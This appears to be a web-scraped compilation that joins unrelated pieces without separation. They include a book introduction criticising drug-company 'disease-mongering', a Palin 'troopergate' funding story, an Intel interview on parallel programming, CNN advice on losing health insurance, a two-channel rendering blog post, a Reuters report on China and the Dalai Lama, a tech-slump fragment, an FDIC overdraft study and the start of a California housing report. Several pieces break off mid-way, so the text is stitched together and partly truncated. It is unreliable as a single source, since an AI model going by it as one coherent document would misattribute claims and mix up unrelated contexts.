But there is a growing sense that too many of them are driven by the unhealthy influences of misleading marketing rather than genuine need .
And those marketing strategies , like the drug companies , are now well and truly global .
Working from his midtown Manhattan office in New York City , Vince Parry represents the cutting edge of that global marketing .
An expert in advertising , Parry now specializes in the most sophisticated form of selling medicines : he works with drug companies to help create new diseases .
In an astonishing article titled “ The art of branding a condition , ” Parry recently revealed the ways in which companies are involved in “ fostering the creation ” of medical disorders .
8 Sometimes a little - known condition is given renewed attention , sometimes an old disease is redefined and renamed , and sometimes a whole new dysfunction is created .
Parry ’s personal favorites include erectile dysfunction , adult attention deficit disorder , and premenstrual dysphoric disorder – a disorder so controversial some researchers say it does n’t even exist .
With rare candor Parry has explained how pharmaceutical companies now take the lead , not just in branding their blockbuster pills like Prozac and Viagra , but also in branding the conditions that create the markets for those pills .
Working under the leadership of the drug marketers , Madison Avenue gurus like Parry get together with medical experts to “ create new ideas about illnesses and conditions . ”
9
The goal , he says , is to give drug company customers around the world “ a new way to think about things . ”
10 The aim , always , is to make the link between the condition and your medicine , in order to maximize its sales .
The idea that drug companies help to create new illnesses may sound strange to many of us , but it is all too familiar to industry insiders .
A recent Reuters Business Insight report designed for drug company executives argued that the ability to “ create new disease markets ” is bringing untold billions in soaring drug sales .
11 One of the chief selling strategies , said the report , is to change the way people think about their common ailments , to make “ natural processes ” into medical conditions .
People must be able to be “ convinced ” that “ problems they may previously have accepted as , perhaps , merely an inconvenience ” – like baldness , wrinkles , and sexual difficulties – are now seen as “ worthy of medical intervention . ”
12 Celebrating the development of profitable new disease markets like “ Female Sexual Dysfunction , ” the report was upbeat about the financial future for the drug industry .
“ The coming years will bear greater witness to the corporate sponsored creation of disease . ”
13 The unhealthy influence of the pharmaceutical industry has become a global scandal .
That influence is fundamentally distorting medical science , corrupting the way medicine is practiced , and corroding the public ’s trust in their doctors .
14
The burying of unfavorable research studies on children and antidepressants , the dangers of the anti-arthritis drugs and the investigations into the alleged bribing of physicians in Italy and the U.S. are just the latest in a string of embarrassments .
15 Exploding drug expenditures have helped produce double - digit increases in the costs of health insurance premiums , fueling further widespread anger towards the industry , particularly in the U.S .
As a result , many doctors , scientists , health advocates , politicians , and medical journal editors are moving to try to wind back the industry ’s influence over scientific research and doctors ” prescribing habits .
16
The time is ripe to understand how that influence now extends right to the very definitions of disease .
Marketing executives do n’t sit down and actually write the rules for how to diagnose illness , but they increasingly underwrite those who do .
The industry now routinely sponsors key medical meetings where disease definitions are debated and updated .
In some instances , as we will see , the medical experts writing the rules are at the same time taking money from the drug makers who stand to make billions , depending on how those rules are written .
Many of the senior specialists deciding whether your sexual difficulties should be defined as sexual dysfunctions , whether your stomach complaints should be seen as serious medical conditions , and whether your everyday risks should be portrayed as deadly diseases , are on the payrolls of the companies seeking to sell you drugs .
The payment of money does n’t necessarily buy influence , but in the eyes of many observers , doctors and drug companies have simply become too close .
With many medical conditions , there is great uncertainty about where to draw the line that separates the healthy from the sick .
The boundaries that separate “ normal ” and “ abnormal ” are often highly elastic , they may differ dramatically from country to country , and they can change over time .
Clearly , the wider you draw the boundaries that define a disease , the wider the pool of potential patients , and the bigger the markets for those making drugs .
The experts who sit down to draw those lines today are too often doing so with drug company pens in their hands , and they are drawing the boundaries wider and wider almost every time they meet .
According to these experts , 90 percent of the elderly in the U.S. will have a condition called high blood pressure , almost half of all women have a sexual dysfunction called FSD , and more than 40 million Americans should be taking drugs to lower their cholesterol .
17 With a little help from a headline - hungry media , the latest condition is routinely portrayed as widespread , severe and , above all , treatable with drugs .
Alternative ways of understanding or treating health problems , and lower estimates of the numbers affected , are often swept away by a frenzy of drug company promotion .
While the boundaries defining disease are pushed out as widely as they can be , by contrast , the causes of these supposed epidemics are portrayed as narrowly as possible .
In the world of drug marketing , a major public health problem like heart disease can sometimes be reduced to a narrow focus on a person ’s cholesterol levels or blood pressure .
Preventing hip fractures among the elderly becomes a narrow obsession with the bone density numbers of healthy middle - aged women .
Personal distress is seen as being due largely to a chemical imbalance of serotonin in the brain , an explanation as narrow as it is outdated .
Like most everything else that happens in health care today , our ideas about sickness are being shaped in the long shadows cast by the global drug giants .
Yet the narrowing of the focus is making it harder for us to see the bigger picture about health and disease , sometimes at great cost to the individual , and the community .
To use a simple example , if an improvement in human health was our primary aim , some of the billions currently invested in expensive drugs to lower the cholesterol of the worried well might be far more efficiently spent on enhanced campaigns to reduce smoking , increase physical activity , and improve diet .
There are many different promotional strategies used in the selling of sickness , but the common factor among them all is the marketing of fear .
The fear of heart attacks was used to sell women the idea that the menopause is a condition requiring hormone replacement .
The fear of youth suicide is used to sell parents the idea that even mild depression must be treated with powerful drugs .
The fear of an early death is used to sell high cholesterol as something automatically requiring a prescription .
Yet ironically , the much - hyped medicines sometimes cause the very harm they are supposed to prevent .
Long - term hormone replacement therapy increases the risk of heart attacks for women , while antidepressants appear to increase the risk of suicidal thinking among the young .
At least one of the blockbuster cholesterol - lowering drugs has been withdrawn from the market because it was implicated in causing deaths .
In one of the most horrific cases of all , a drug sold as helping with common bowel problems led to constipation so severe for some people , they simply died .
Yet in this case , as in so many others , the official government regulators somehow seemed more interested in protecting drug company profits than the public ’s health .
18
The pharmaceutical industry and its supporters defend their marketing campaigns as raising awareness about misunderstood diseases , and providing quality information about the latest medicines .
Company executives talk of empowering consumers with advertising , and their paid celebrities are said to educate the public about health conditions via glossy magazine articles and on TV talk shows .
Certainly there are some valuable examples of industry - sponsored efforts to destigmatize a health problem or stimulate much - needed action , as has occurred in the area of HIV - AIDS .
Yet in other cases these campaigns are not education at all , but plain old promotion : skewing our understanding of the causes of human illness and distorting our knowledge of the remedies , playing up the benefits of drugs and playing down their harms and costs .
A loosening of advertising regulations in the late 1990s in the U.S. has delivered an unprecedented onslaught of drug marketing targeted at ordinary people , who now watch an average of ten or more of these advertisements every day .
Likewise , viewers in New Zealand are subject to this sort of promotion .
Elsewhere in the world the industry is fighting relentlessly for similar deregulation .
For the supporters , this marketing is a valuable service ; for the critics , it is putting disease at the center of human life .
It is pushing the genuinely ill towards a limited range of the most expensive drug solutions , and making tens of millions of the healthy start to fear that their bodies are broken , dysfunctional , deficient , and decaying .
This disease - mongering is an assault on our collective soul by those seeking to profit from our fear .
It is no dark conspiracy , simply daylight robbery .
Selling Sickness unmasks the latest marketing techniques from the drug industry ’s multi-layered campaigns .
Technique by technique , condition by condition , a pattern emerges , a formula for changing the way we think about illness in order to expand markets for drugs .
The diseases explored here are not the only ones being oversold ; they are , though , among the most dramatic , compelling , and freshest examples we have .
Once you become familiar with the formula , and start to recognize the tricks of the trade , you ’ll begin to see the black magic of disease marketing at work everywhere .
Some of the promotional strategies may already be familiar , but the dirty tricks and covert operations are likely to shock and anger many readers .
The aim of Selling Sickness is not to further discredit a much maligned drug industry , or its many valuable products .
Nor is the goal to denigrate the many fine and principled people who work inside these giant corporations and who are motivated , like many hardworking medical scientists outside , to discover and develop safe and effective new therapies .
Rather , the plan is to expose the way in which the industry ’s promotional machinery is turning too much ordinary life into medical illness , in order to expand markets for medications .
Over three decades ago a maverick thinker called Ivan Illich raised alarms that an expanding medical establishment was “ medicalizing ” life itself , undermining the human capacity to cope with the reality of suffering and death , and making too many ordinary people into patients .
19
He criticized a medical system “ that claims authority over people who are not yet ill , people who cannot reasonably expect to get well , and those for whom doctors have no more effective treatment than that which could be offered by their uncles or aunts . ”
20 A decade ago medical writer Lynn Payer described a process she called “ disease - mongering ” : doctors and drug companies unnecessarily widening the boundaries of illness in order to see more patients and sell more drugs .
21
In the years since , these writings have become ever more relevant , as the industry ’s marketing roar has grown louder and its grip on the health care system much stronger .
Soaring sales have made drug companies the most profitable corporations on the planet during particular years of the past decade .
22
But the flip side of healthy returns for shareholders is an unsustainable increase in costs for those funding the health system , whether they are governments or private insurers .
It is no surprise that the industry ’s unhealthy influence has become part of the political debate in many nations , which exploded in Australia during negotiations over the recent free trade deal with the U.S.
As the public learns more about industry ’s influence over the definitions of disorders and dysfunctions , and its methods for creating “ new disease markets , ” the selling of sickness will likely move closer to the center of those debates .
Like the best of scientific inquiry this work of journalism is offered as part of an ongoing conversation , to be continued with friends , families , and physicians , with other health care providers , work colleagues , health officials , and elected representatives : a conversation that questions the corporate - sponsored selling of sickness , and explores new ways to define and understand disease .
It is a conversation that could ideally benefit from the energy and enthusiasm of a whole new global collaboration of independent researchers and health advocates , whose primary aim is to promote a more rational and informed public debate about human health , rather than simply selling fear in order to sell pharmaceuticals .

Texas evangelicals funded effort to kill Palin ' troopergate ' probe John Byrne
Published : Sunday February 8 , 2009

You ca n't see Russia from Texas .
But that 's where some of the money that helped an effort aiming to kill a probe investigating whether Alaska Gov. Sarah Palin acted inappropriately in firing the state 's public safety chief came from .
Gift records show that an evangelical group and two law firms working with it shelled out $ 185,000 to represent six Alaska legislators in an unsuccessful bid to quash the state legislature 's investigation into " troopergate . "
The evangelical group -- Liberty Legal Institute -- is affiliated with Focus on the Family 's James Dobson .
Liberty is the legal arm of the Free Market Foundation , which " lists its guiding principles as limited government and promotion of Judeo - Christian values , " according to the Anchorage Daily News .
On Friday , Gov. Sarah Palin 's husband Todd was held in contempt by the Alaska State Senate .
The news was barely reported -- and seemed relatively fruitless from a national political standpoint , since it came months after Palin 's failed bid for the presidency .
The gift records also show an in - kind contribution of legal services from Gibson , Dunn & Crutcher LLP totaling $ 120,000 , a national lawfirm appearing on behalf of Liberty Legal , and $ 40,000 from the firm of Alaska attorney Kevin Clarkson .
That brings the total bill for their lawsuit to $ 185,000 .
The suit against the legislators pursuing charges against those probing Palin was dismissed last fall .
All six men who filed the suit were Republicans .
" I said so , who is paying who to do this ? "
Carl Gatto , one of the lawmakers involved in the suit , said .
" And they said they were volunteering , the attorneys were volunteering .
Then I discovered I had to report it as gifts .
So I did . "
" If you feel like there is an injustice being done you have a right to file a lawsuit , " he added .
The lawyer who defended the Legislative Council against that lawsuit and two others seeking to stop the " troopergate " investigation was shocked when called by the Anchorage Daily News .
" Wow , " he said .

Parallelism and performance go hand - in - hand .
But achieving maximum performance can be a balancing act , as Intel senior engineer James Reinders explains to Dr. Dobb 's editor in chief Jonathan Erickson .
Dr. Dobb's : Sandia National
Labs engineers say that adding cores to high - performance computers slows data - intensive apps .
Your thoughts ?
Reinders :
It is an issue of " balance . "
It certainly is n't that data - intensive application cannot use parallelism .
Good performance requires a characteristic we call " balance . "
One person 's balance is another person 's headache .
Supercomputer systems , in order to get the " balance " they need , place a high premium on things like memory bandwidth , I/ O bandwidth , and low latency communications to mention a few .
If we have a system which is tipping out of balance in a way where computing ability is not the bottleneck ( say memory bandwidth is the limitation ) -- then adding more computing ability ( e.g. , more cores ) will not help .
In fact , because it is likely to add more contention it can slow things .
The latest Intel architecture , we code named " Nehalem " and now available as processors known as Intel Core i7 , put enormous emphasis on adding features to maintain or add balance .
If the new architecture had simply added cores , without the new features , many people would have found slow down issues .
The key features which add " balance " are QuickPath Interconnect ( QPI ) and an integrated memory controller , resulting in unprecedented amount of aggregate bandwidth .
Is it enough to get balance for everyone ?
It never is .
Balance is a fundamental challenge in computer design , a classical example of a design goal in the face of numerous engineering tradeoffs .
It will never end .
That 's why characterization of behavior , like the work done at Sandia , help frame the problems so they can be solved .
Dr. Dobb's : Microsoft 's
Azure does n't support multicore applications .
Is there a place in the cloud for parallelization ?
Reinders : Parallelism is very important to cloud computing .
Azure is clearly designed to use lots of cores .
The initial implementation of Azure choose to assume we will have lots and lots of cores over time , and it has a simple one to one correspondence of physical cores to VMs .
This is because Azure 's future is more about doing many things in parallel rather than doing a few things each being parallelized .
In this model , a multi - threaded program can still run on a single physical core -- and can still get parallelism when that core has hardware threading ( such as in Intel Core i7 ) .
My best guess would be that as we get many more cores , Azure would be tempted to let a single VM own multiple cores .
I do think they will resist letting a single core run multiple VMs .
To my understanding , that is the main they started with the one to one correspondence of VMs and cores .
I think that was a rather bold but important decision .
It add predictability to a system , and relies on growing upon a future where cores will be even more numerous .
Cloud computing loves cores .
On multiple levels , it is trying to avoid shared mutable state , within applications .
This is a good thing .
Dr. Dobb's : Shared - memory programming or message passing ?
Which is the better way to do parallel programming ?
Reinders :
If I have to pick -- the answer is message passing .
If I was teaching parallel programming to new minds , with the goal of awakening them to " think parallel " , I would start with something based on message passing .
However , if I 'm giving advice to someone with an existing program that needs parallelism added with minimal fuss and on a schedule -- I 'm unlikely to advocate message passing .
Message passing is a fundamental concept that is probably more important than OOP to the future of computing .
I 'm not sure we 'll call it message passing for long .
That said , shared - memory programming is n't going away and will dominate programming for the foreseeable future .
It is familiar and incremental .
It is also the root of the key headache in parallel programming : " shared mutable state . "
Most programmers will use shared - memory programming , and need to learn a lot about " shared mutable state " and how to deal with it .
Issues that it leads to such as deadlocks and race conditions haunt parallel programmers using shared memory programming .
Message passing , on the other hand , avoids " shared mutable state " , but lacks the familiarity of shared memory programming .
New frameworks , similar to OOP in many ways , which use " actors " or " agents " seem to have an intuitive feel that may attract more programmers than the most used messaging passing interface called MPI .
Dr. Dobb's : Transactional memory .
What is it and why is it important ?
Reinders : Transactional memory tries to make " shared mutable state " in parallel programs manageable by providing an illusion of " all or nothing " for memory updates .
The concept of a " transaction " for a database is well established -- and taken for granted that you either want to update a whole record in a database all - at - once or not - at - all .
Imagine changing your plane ticket from Tuesday 8:00 to Thursday 11:30 but the database update switched Tuesday ->
Thursday and 8:00 ->11:30 independently , with the possibility one succeeds and the other fails .
No one expects that with a database .
So transactional memory is this idea " Hey !
What if we could update memory like a database -- in transactions ? "
This would bring easier to understand programming as well as less contention between parallel threads which will lead to more scaling / speed - up .
Perfect in a parallel world .
This is very attractive because " shared mutable state " is the root of many parallel programming problems .
That said , we just have to figure out how to build it .
Key topics include : what should be in software vs. hardware ? , how large of a transaction needs to be handled ? , what are the exact semantics ? , what are the failure modes ?
It remains an incredibly important research topic because it seems to offer so much hope .
There are a number of companies doing software and hardware implementations to continue exploring this topic .
Our Software Transactional Memory ( STM ) Compiler is available at http://whatif.intel.com for experimenting in C/C ++.
Dr. Dobb's :
We keep hearing that multicore and parallelization will demand new skill sets on the part of developers .
What kind of skills , for instance ?
Reinders : I have to start with " Think Parallel . "
What did a developer for programs before parallelism needed to know ?
The fundamentals include data structures , algorithms , modularity , parsing , databases , and operating systems .
How do I mention good design and change control ?
How much you know about each , and what exact skills you develop , is an individual thing .
Add parallelism , and we need to understand parallelism as part of all of these .
Some of this has been going on for some time -- any database expert is going to have thought about parallelism in many ways for years now .
Ditto for operating systems , at least at some levels .
Other things like parallelism in algorithms and data structures are new to many developers .
Start with " Think Parallel . "
Understand where parallelism can be exploited in your application , and the pros and cons of different approaches .
In addition to " Think Parallel " the two key skills are :
Writing scalable code .
The shift in mindset here is fundamental : a good program needs to scale much more than it needs to be efficient .
This is a very difficult concept for most to embrace , and if you develop a skill at seeing how to write code that scales , you will have a skill that will be in demand .
To survive , we all need to cope with the issue of scaling some .
Dealing with shared information , managing global state sharing .
Do you share mutable state ?
if not , how do you update state globally ?
The desire to make global state visible , but not globally changeable , is really similar to the debates in OOP about public vs. private with all the same issues .
Dr. Dobb's : Locks .
Good , bad , or just ugly ?
Putting this another way , do you prefer locks or no-locks ?
Reinders : Neither , I prefer working programs that scale .
Unfortunately , as ugly as locks are , they are here to stay .
Nothing will make them disappear -- every if STM or lock - free algorithms catch on , locks will remain .
So we need to understand them , even while we try to minimize their use .
The key being " minimize " -- like the Albert Einstein 's quote " Make everything as simple as possible , but not simpler . "
Locks are not the real issue .
The issue is highly contended locks .
Grabbing a lock , and releasing it , generally is very clear programming to keep share mutable state correct in a parallel program .
A huge problem occurs when many parts of a program have to wait for a lock to be available because there is contention .
This kills scaling of a program ( because there is a lot of overhead to being parallel -- overhead being the waiting for locks ) .
Of course , the solution is eliminating the contention !
As usual , the best approach is to question the need for the contention in the first place .
Can you rewrite your program to not have to fight over this shared state ?
If you need the contention over the shared mutable state , then you question the need for the lock .
Two promising approaches are lock - free algorithms and transactional memory .
The first is hard and easy to get wrong , and the later is still a research topic .
I love looking at lock - free algorithms / methods .
Honestly , most lock - free proposals I see are wrong .
The ones that are right , are brilliant but can really make your head hurt as you puzzle out if they are guaranteed to work in all cases .
Writing lock - free code is playing with fire .
The rewards for getting it right are great , the challenge many .
I 've never encourage people to try to solve there lock problems by rewriting as a lock - free algorithm .
Over time , we 'll add lock - free algorithms and algorithms with low contention for locks , into our libraries and programming languages .
So if you want to write lock - free code , do it for all of us , and then I can point to it as something everyone should use .
So , when looking at an algorithm - do n't ask " are they lock free ? "
Instead ask " how much contention will I get using these ? "

( CNN ) -- Christina McMenemy 's husband called her on a Monday afternoon last June to say he was coming home early .
She was overjoyed -- some extra , unexpected time with her husband on a lovely summer day .
Christina McMenemy worried about health costs for her family after they lost their health insurance .
But that sweet moment turned sour when she found out why her husband was free to leave work early .
" He said he was pulled into an office after lunch and told , ' Your job 's gone .
Here 's your stuff .
You 're done , ' " McMenemy remembers .
" We had health insurance for one more month , and that was it . "
That health insurance had taken good care of their family -- her husband , Aaron , worked for the state of Ohio -- and once McMenemy got over the initial shock of her husband 's layoff , she set out trying to think of the best way to use the time they had left on insurance .
" I'm a neurotic organizer , " says McMenemy , a freelance writer , blogger and nursing school student .
She immediately began scheduling doctor 's appointments , tests and procedures for herself , her husband and their two daughters : Miranda , who had just turned 1 , and 3 - year - old Cordelia , who has autism .
iReport.com : Have you been recently laid off ?
But McMenemy made one crucial mistake that could have come back to haunt her .
With nearly 700,000 jobs lost in December alone , many people are trying to cram in as much medical care as they can in the short time they have left on health insurance .
But experts say there are land mines out there , and tests you do n't want to have , because the results could make it tough for you to get insurance later .
Watch more on health insurance missteps to avoid »
Here are three mistakes people commonly make when they 're about to lose their health insurance , and how to avoid them .
1. Getting every test out there
That 's the mistake McMenemy made .
She had her internist do a host of tests .
The problem :
If anything bad had turned up , she might have had a very difficult , if not impossible , time getting reasonably priced health insurance because she would have been diagnosed as having a pre-existing condition .
" A savvy consumer might stop and think , ' I do n't know if I want this testing , ' " says Dr. Gail Gazelle , an internist , patient advocate and assistant clinical professor at Harvard Medical School .
" For example , let 's say you snore , and you 're thinking about having a sleep study done .
You might want to wait on that until you have more secure health insurance , " she advised .
Deciding what tests to do and not do can be tricky , adds Dr. Delia Chiaramonte , a patient advocate in Baltimore , Maryland .
In part , it depends on when you think you might get another job .
" If a mammogram shows a likely cancer , it will be very hard to get insurance in the future , " she says .
" If I knew I was going to start another job with insurance in two months , I might hold off on cancer screening until then . "
See this list of screening tests from the federal U.S. Preventive Services Task Force to help make your decisions .
2. Failing to negotiate a price with your doctor
At first , McMenemy did n't want to negotiate health care prices .
" I was nervous .
I was embarrassed about it .
I thought they 'd laugh at me , " she says .
But with her family 's last day of insurance looming , McMenemy gathered her courage and asked her daughters ' pediatrician if she could continue seeing him for a lower rate than what her insurance company had been paying .
She was pleasantly surprised when the office manager told her she could pay $ 40 for an office visit .
" They told me they had patients ask them to do this all the time , and it was no big deal , " she says .
" I was really grateful because I did n't want to lose my pediatrician . "
" You'd be surprised how many doctors , especially primary care physicians such as internists and pediatricians , will do this for their patients , " Gazelle says .
" You can even appeal to your doctor to see you for free , " she says .
" Doctors are all well aware of the horrendous economic situation we 're in . "

3. Forgetting about immunizations
Given the panic you might feel about the short - term ramifications of losing your health insurance , you might forget about the long - term benefits of immunizations not just for your children , but for yourself .
Get them while your insurance is still paying for them , advises Dr. Sandra Fryhofer , past president of the American College of Physicians
" Make sure you 're up to date on adult immunizations -- their preventive effects are long lasting , " Fryhofer says .
Vaccines can help prevent diseases such as tetanus , diphtheria , whooping cough and shingles .
Here 's the CDC 's full list of adult vaccines and when to get them .
As for McMenemy , she 's grateful the tests she got in her waning days of health insurance did n't show anything wrong .
As she waits for graduation from nursing school in June -- and , she hopes , a job with insurance -- McMenemy 's top priority has been to keep her daughters insured .
At first , she was successful :
She enrolled her daughters in Ohio's SCHIP , a state program for children who do n't have health insurance .
But then in December , her husband got a three - month freelance job , and his income made her daughters ineligible .
Now , her daughters are back to having no health insurance .
Her second worry is about precancerous moles she had removed just before her husband found out he'd been laid off .
" I was supposed to go back for a four - month follow - up appointment , but I did n't because I can't afford it , " she said .
" So now I 'm always wondering , what if I have cancer ?
What if I 'm missing something big and something terrible happens just because I do n't have insurance ?
Am I cheating my girls out of time with me ? "

All About Health Care Costs • Layoffs and Downsizing • Family Medicine
Reducing the memory consumed by a framebuffer is often useful in modern rendering , as the advent of HDR techniques both scales memory usage and can often steal an alpha channel , preventing correct blending .
Here 's a method for reducing the number of color channels required from 3 down to 2 , thus allowing space to either be reclaimed or used to obtain two spare alpha channels .
Introduction
People often complain that next - gen games have an " everything is brown " look to them .
So I figure , if it is indeed the case that the game is not making full use of the full RGB spectrum , why not try and take advantage of that to optimize rendering accordingly ?
Many graphics cards do n't offer very good support for HDR render targets , so a lot of games try to use some sort of packed LDR format to store data .
One popular solution is to pack large values into existing 32 - bit RGBA render targets , for example by converting into a YUV representation , then storing Y split across two color channels .
The downside to the LogLUV approach and others like it , is that it consumes the alpha channel .
This makes it hard or impossible to achieve alpha - based transparency .
So , I figured you could do a rendering system using only two color channels ( which I call ST ) , instead of the standard RGB .
With only two channels to deal with , it becomes possible to still fit data into a 32 bpp render target , while still allowing the pixel shader to output a conventional alpha value .
Two - channel rendering
Rendering with only two color channels has been attempted before , on a small number of occasions .
Most notable is the long - abandoned two - strip Technicolor™ system , invented in the 1920s .
In this the camera filmed onto two black - and - white films , one using a red filter and the other using a blue / green filter .
The full - color image was effectively reconstructed by duplicated the blue / green channel into both the blue and green channels at playback .
Jim Blinn used a two - channel system for compressing planetary texture data in 1980 .
His system used one channel for brightness and one for saturation , assuming the hue to be constant .
My idea is basically similar to the Technicolor approach , except I automatically tweak the filter coefficients to optimize for a given reference image .
Implementation
We first define our two color channels ( ST ) like so :
S = clamp ( R×c0 + G×c1 + B×c2 ) T = clamp ( R×c3 + G×c4 + B×c5 )
This transform can be applied at the end of the pixel shader , outputting S and T into two of the final framebuffer channels .
We can later reverse the transform as a post - process effect , using the following :
R′ = clamp ( S×c6 + T×c7 ) G′ = clamp ( S×c8 + T×c9 ) B′ = clamp ( S×c10 + T×c11 )
The only question remaining is how to decide the filter coefficients .
I wrote a small off - line utility which would take a reference image , and try to optimize the coeffients for it .
It tries various random values and keeps the set which has the least RMS error when applied .
Once an optimal filter set is chosen for a given scene , the coefficients can be written out for use at runtime .
Results
Here 's some pictures of Gears Of War , showing before and after .
Image 1
S = RGB • [ 0.5 0.3 0.3 ] , T = RGB • [ 0.1 0.0 0.8 ]
R′ = ST • [ 1.8 - 0.8 ] , G′ = ST • [ 0.8 0.2 ] , B′ = ST • [ - 0.2 1.2 ]
Image 2
S = RGB • [ - 0.4 0.1 1.3 ] , T = RGB • [ 0.4 0.2 0.4 ]
R′ = ST • [ - 0.7 1.7 ] , G′ = ST • [ - 0.1 1.1 ] , B′ = ST • [ 0.5 0.5 ]

S = RGB • [ 1.7 - 0.4 - 0.3 ] , T = RGB • [ 0.2 0.0 0.8 ]

BEIJING ( Reuters ) - China ’s foreign minister , speaking ahead of two sensitive anniversaries next week , warned other countries on Saturday not to let the Dalai Lama use their territory to try to sever Tibet from Chinese control .

Beijing abruptly canceled a China - EU summit last year , angry over French President Nicolas Sarkozy ’s meeting with the exiled Tibetan spiritual leader whom Beijing condemns as a separatist .
The Dalai Lama , who fled Tibet in March 1959 after a failed uprising against Chinese rule , says he only wants greater autonomy for the remote region in China ’s far west rather than outright independence .
“ In developing relations with China , other countries should not allow the Dalai Lama to visit their countries and should not allow their territories to be used for the Dalai Lama to engage in separatist activities for Tibet ’s independence , ” Foreign Minister Yang Jiechi said .
“ I think this is an integral part of the norms governing international relations , ” he told a news conference on the sidelines of the annual meeting of parliament .
The 50th anniversary of the Nobel Peace Prize - winning monk ’s flight into exile falls on Tuesday .
Also , on March 14 last year , Lhasa erupted into riots that killed 19 mostly Han Chinese or Hui Muslim shopkeepers .
“ The Dalai Lama ’s side still insists on establishing a so - called Greater Tibet on a quarter of Chinese territory .
They want to drive away Chinese armed forces on Chinese territory and ask all non-Tibetans to relocate themselves , people who have long spent their lives on that part of Chinese territory .
You call this person a religious figure ? ”
Yang said .
“ Would Germany , France or other countries accept that a quarter of their territory be separated ?
Please keep in mind that China was always a supporter of German reunification . ”
China has ruled remote and mountainous Tibet with an iron hand since People ’s Liberation Army troops marched into the region in 1950 .
The Lhasa riots triggered demonstrations and marches throughout ethnically Tibetan regions which were quelled after a few days by Chinese police and paramilitary troops .
Thousands of Tibetans were rounded up in the following crackdown across the region last year .
Exiled Tibetan groups say many were beaten and some were killed , prompting anti-China demonstrations which disrupted some international legs of the Beijing Olympics torch relay .
A Chinese - language website catering to Tibetans shut for repairs on Friday , coinciding with next week ’s anniversaries .
The popular website featured news from China ’s state - run media and government , as well as cultural and Buddhist content .
“ Tibet Culture Net will begin upgrading and maintenance , which will need about a week to complete , ” read a notice posted on www.tibetcul.com on March 5 .
“ During the period , Tibet Culture Net can not be accessed .
Please be understanding . ”
Amnesty International said this week they and other groups had continued to receive reports of human rights violations in Tibet and surrounding regions .
“ There is a real danger that if the Chinese authorities do not adopt an approach based on respect for freedom of expression and for the distinct culture and traditions of the Tibetan population , the protests could escalate , ” it said in a report .
A German newspaper , the Frankfurter Rundschau , on Friday quoted the Dalai Lama as saying Tibet was very tense and that there could be “ an explosion of violence ” at any time .
And International Campaign for Tibet , an activist group , said that two women , one of them a nun , had been detained on Thursday in Garzi , western Sichuan province , for handing out leaflets calling for the return of the Dalai Lama .
But Tibet ’s governor said this week he did not expect any major disturbances during next week ’s anniversaries and denied authorities had significantly boosted security forces .

SAN FRANCISCO 
The global credit crisis may have caused the decline in consumer and business spending that is assaulting the giants of high tech .
But as the dominant technology companies try to emerge from this slump , they may find themselves blaming people like David Title just as much as they blame Wall Street .
Mr. Title , a 35 - year - old new - media manager at a film production company in New York , has dropped his cable subscription and moved to watching most of his television online  free .
While shopping for a new laptop for his girlfriend recently , he sidestepped more expensive full - featured computers and picked a bare - bones , $ 200 Asus EeePC laptop , also known as a netbook .
“ We ’ve reached one of those moments in tech history when there are low - priced and free alternatives that are both user - friendly and reliable enough to make the switch , ” Mr. Title said .
“ Then there ’s the extra bonus of saving some cash . ”
Silicon Valley has been gripped by a growing sense that the economic retreat might do more than depress earnings .
There is too much ingrained optimism here to think that the tech sector will not bounce back , stronger than before .
HOW BANKS PROCESS TRANSACTIONS HOW BANKS PROCESS TRANSACTIONS
Large banks are more likely to clear checks from large to small dollar amounts , often triggering more overdraft fees .
Asset size Pct. of banks clearing checks large to small Less than $ 250 million 20.7 % $ 250 million to less than $ 1 billion 25.8 %
More than $ 1 billion 53.7 %
All banks 24.7 % Source : FDIC survey of 1,171 banks it regulates ; 289 banks responded to question about check clearing and dollar amounts Overdraft fees are boosting banks ' profits at the expense of consumers , especially young and low - income people , finds a new Federal Deposit Insurance Corp. study .
The 18 - month survey found that most banks automatically enroll consumers in overdraft programs — some do n't allow them to opt out — and then cover overdrawn transactions for a per-item fee of up to $ 38 .
The survey excludes many of the largest banks in the nation , because it covers only FDIC - regulated banks .
Still , it 's the largest study of overdraft programs by a bank regulator and helps " fill an important universe of information that has not been available to policymakers , " says Andrew Gray , agency spokesman .
EARLY CHARGES : Some fees kick in when you use debit card OUR VIEW :
Be fair assessing fees
In recent years , consumer groups have received an increasing amount of complaints about overdraft fees .
The Federal Reserve has proposed a rule , which it expects to finalize by year 's end , that requires banks to give customers the ability to " opt out " of overdraft programs .
But advocates say the rule does n't go far enough because banks do n't have to obtain explicit permission from customers to pay their checks and debit card transactions .
A bill by Rep. Carolyn Maloney , D - N.Y. , would require banks to sign up consumers for this service .
The FDIC 's survey found : • Most banks that automatically enroll consumers allow them to overdraw by check , ATM or debit card purchases .
About half of all overdrafts occur at ATMs or via debit card transactions , which tend to be for smaller dollar amounts .
• Banks surveyed earned $ 1.97 billion in overdraft - related fees in 2006 , representing 74 % of their overall $ 2.66 billion in service charges on deposit accounts .
In total , overdraft - related fees bring in $ 17.5 billion each year to banks and credit unions , estimates advocacy group Center for Responsible Lending .
• Large banks are more likely to process transactions from largest to smallest dollar amount , often triggering more fees .
• Young and low - income consumers are disproportionately affected by overdraft fees .
" The most vulnerable consumers are getting hit with these fees , " says Chi Chi Wu of the National Consumer Law Center .
Nessa Feddis , senior counsel at the American Bankers Association , says that overdraft fees are avoidable .
The FDIC 's survey — which showed that only a quarter of consumers pay overdraft fees — confirms ABA 's findings , Feddis notes .
Yet Michael Moebs , a bank consultant , says his research shows that nearly half of consumers pay overdraft fees each year .

The California housing market has had its worst year on record .
2008 will go down as one of the most difficult and volatile economic years in history .
With that said , there is still a lingering notion or profound desire for bargain hunting .
Many articles now try to call a bottom in the stock markets by looking at market fundamentals .
Similarly many are now trying to call a bottom in housing in particular the California housing market .
It is hard not to be tempted to call a bottom .
It is tempting to call a bottom since the median price of a California home has gone from a peak in May of 2007 of $ 484,000 to the current price of $ 258,000 .
That is a stunning drop of 46 percent in slightly over a year .
This is going to be a comprehensive housing report for the state of California .
The challenging thing in today ’s market is n’t so much that the data is n’t available , but trying to put the data together into some meaningful analysis .
The data used in this report comes from the American Community Survey which was released only a few weeks ago and has data reflecting changes all the way up until the end of 2007 .
I ’ve also combined this data with the home price data from DataQuick which has covered the California housing market for many years and is used by many analyst and reporters .
The data in this analysis will cover 32 of the most populace counties in the state and covers 33,888,596 people and 11,561,712 households .
This should be a very comprehensive report .
The main question many people are thinking about is whether the state of California is or near a housing bottom .
Simply stating we have a bottom because prices have fallen 46 percent from their peak is not an economic argument or holds much water under analysis .
We had a prolonged bubble that had its roots planted way back in 1979 .
It took many years to build and hit the peak only last year .
We may be looking at a multiple year correction here .
Analysis # 1 – Income to Price Ratios
* Click for sharper image
